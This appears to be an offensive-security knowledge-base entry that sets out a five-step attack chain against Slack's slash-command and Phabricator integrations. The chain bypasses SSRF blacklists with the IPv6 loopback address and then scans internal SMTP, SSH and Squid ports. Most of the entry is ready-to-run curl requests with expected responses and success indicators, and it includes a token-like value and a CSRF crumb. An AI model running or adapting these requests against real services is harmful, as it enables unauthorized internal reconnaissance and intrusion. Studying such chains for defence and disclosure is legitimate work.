---
tags:
  - ssrf
  - ipv6
  - slack
  - integration
  - blind-ssrf
  - internal-recon
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Configure-Slack-Slash-Command-for-SSRF-via-IPv6]]'
  - '[[procedures/Execute-Slack-Slash-Command-to-Trigger-SSRF]]'
  - '[[procedures/Configure-Phabricator-Integration-for-Blind-SSRF]]'
  - '[[procedures/Test-Phabricator-with-Closed-Port-for-Blind-SSRF]]'
  - '[[procedures/Scan-Internal-Services-via-SSRF-Vector]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.377Z'
description: >-
  Multi-stage attack exploiting SSRF in Slack integrations by bypassing IPv4
  blacklists using IPv6 loopback addresses to access internal services like SSH,
  SMTP, and Squid proxy.
skill_level: intermediate
impact_level: high
id: dd01711c-07c9-44c2-8ec0-804414dcc502
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Slack SSRF Bypass via IPv6 Loopback in Slash Commands and Phabricator Integrations

Multi-stage attack chain demonstrating exploitation of SSRF in Slack's integrations by using IPv6 loopback addresses to evade IPv4 blacklists, enabling access to internal loopback services for reconnaissance and potential further attacks.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Configure Slash Command] --> B[Execute Slash Command SSRF]
    B --> C[Configure Phabricator]
    C --> D[Test Closed Port]
    D --> E[Scan Internal Services]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses direct HTTP requests via browser or curl)

### Target Environment

- Slack workspace with admin access to integrations
- Services bound to IPv6 loopback (::) on internal ports (e.g., SSH:22, SMTP:25, Squid:3128)
- Web-based access to Slack's service configuration endpoints

### Initial Access Requirements

- Valid Slack OAuth token (e.g., xoxs-...)
- CSRF crumb token for service edits
- Network position allowing access to Slack's API and services endpoints

## Detailed Attack Procedures

### Step 1: Configure Slash Command for SSRF
procedure: [[procedures/Configure-Slack-Slash-Command-for-SSRF-via-IPv6]]

**Objective**: Modify the URL in a Slack slash command integration to point to an internal IPv6 loopback endpoint, bypassing SSRF protections.

**Instructions**: Use [[commands/configure-slack-ssrf-slash-command]] to update the command configuration:

```bash
curl -X POST https://agarri.slack.com/services/4814366410 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "crumb=s-1431286469-c73f073ed6-%E2%98%83&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:25/&method=GET&in_autocomplete=on&desc=&usage=&label="
```

**Expected Output**: HTTP 200 OK with configuration update confirmation.

**Success Indicators**:
- Service updated without errors
- URL set to http://[::]:25/

### Step 2: Execute Slash Command to Trigger SSRF
procedure: [[procedures/Execute-Slack-Slash-Command-to-Trigger-SSRF]]

**Objective**: Trigger the backend request to the configured IPv6 loopback URL, accessing internal SMTP service on port 25.

**Instructions**: Execute the slash command using [[commands/execute-slack-ssrf-command]]:

```bash
curl -X POST https://agarri.slack.com/api/chat.command?t=1431286754 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "agent=webapp&command=/ssrf&text=&channel=C04QDFHLT&token=xoxs-4829527689-4829527691-4814341714-d0346ec616&set_active=true&_attempts=1"
```

**Expected Output**: JSON response with SMTP banner: {"ok":true,"response":"220 squid3.tinyspeck.com ESMTP Postfix\r\n221 2.7.0 Error: I can break rules, too. Goodbye.\r\n"}

**Success Indicators**:
- 200 OK response containing internal service banner
- Confirmation of loopback access

### Step 3: Configure Phabricator Integration for Blind SSRF
procedure: [[procedures/Configure-Phabricator-Integration-for-Blind-SSRF]]

**Objective**: Set the Phabricator integration URL to an IPv6 loopback endpoint targeting SSH on port 22 for blind SSRF testing.

**Instructions**: Update the integration using [[commands/configure-phabricator-ssrf-integration-open-port]]:

```bash
curl -X POST https://agarri.slack.com/services/4836378801 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "edit_service=1&edit_label=1&phabricator_url=http://[::]:22/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1"
```

**Expected Output**: HTTP 302 Found with Location: /services/4836378801?updated=1, indicating port open.

**Success Indicators**:
- Redirect to updated service page
- No errors, implying SSH banner received (protocol mismatch)

### Step 4: Test Phabricator with Closed Port for Blind SSRF
procedure: [[procedures/Test-Phabricator-with-Closed-Port-for-Blind-SSRF]]

**Objective**: Verify blind SSRF by configuring a closed port (e.g., 21) and observing failure response.

**Instructions**: Update to a closed port using [[commands/configure-phabricator-ssrf-integration-closed-port]]:

```bash
curl -X POST https://agarri.slack.com/services/4836378801 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "edit_service=1&edit_label=1&phabricator_url=http://[::]:21/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1"
```

**Expected Output**: HTTP 500 Server Error, indicating connection failure.

**Success Indicators**:
- 500 error confirming port closed
- Distinguishes open vs. closed ports in blind SSRF

### Step 5: Scan Internal Services via SSRF Vector
procedure: [[procedures/Scan-Internal-Services-via-SSRF-Vector]]

**Objective**: Use the SSRF vector to probe multiple internal ports for service discovery and reconnaissance.

**Instructions**: Iterate similar requests to test ports like 3128 using variations of [[commands/configure-phabricator-ssrf-integration-open-port]] or slash command execution:

```bash
# Example for port 3128 via slash command reconfiguration and execution
curl -X POST https://agarri.slack.com/services/4814366410 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "crumb=...&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:3128/&method=GET&..."

# Then execute
curl -X POST https://agarri.slack.com/api/chat.command?...&command=/ssrf
```

**Expected Output**: Responses like Squid error pages for open ports.

**Success Indicators**:
- Service-specific responses (e.g., Squid proxy errors)
- Identification of internal services like SSH, SMTP, Squid

## Attack Chain Summary

### Key Achievements

1. Bypassed IPv4 SSRF blacklist using IPv6 loopback [::]
2. Accessed internal services (SSH:22, SMTP:25, Squid:3128) for reconnaissance
3. Demonstrated blind SSRF detection via open/closed port responses

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Reconnaissance]]

---

*Last updated: 2023-10-01T00:00:00Z*
